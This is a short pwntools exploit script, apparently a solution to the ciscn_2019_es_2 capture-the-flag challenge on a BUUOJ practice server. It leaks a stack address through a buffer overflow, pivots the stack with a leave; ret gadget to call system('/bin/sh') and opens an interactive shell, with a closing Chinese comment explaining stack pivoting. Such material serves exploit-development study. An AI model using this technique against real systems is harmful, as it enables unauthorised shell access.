from pwn import *

context.log_level = "debug"

exe = ELF("./ciscn_2019_es_2")
# r = exe.process()
r = remote("node4.buuoj.cn", 26968)
leave_ret = p32(0x8048562)

# 0x08048562: leave; ret;

r.recvuntil(b"?\n")
r.send(cyclic(0x27) + b"A")
r.recvuntil(b"A")
ebp = u32(r.recv(4))
success("ebp: " + hex(ebp))
r.send(
    p32(0) + p32(exe.plt["system"]) + p32(0) + p32(ebp - 0x28) +
    b"/bin/sh\x00" + cyclic(0x28 - 24) + p32(ebp - 0x38) + leave_ret)
r.interactive()

# 栈迁移，看了一些博客得知是栈溢出长度不够时的常规操作，主要思路是把返回地址覆盖为leave, ret指令地址，两次返回后能够修改esp的位置并获取栈地址
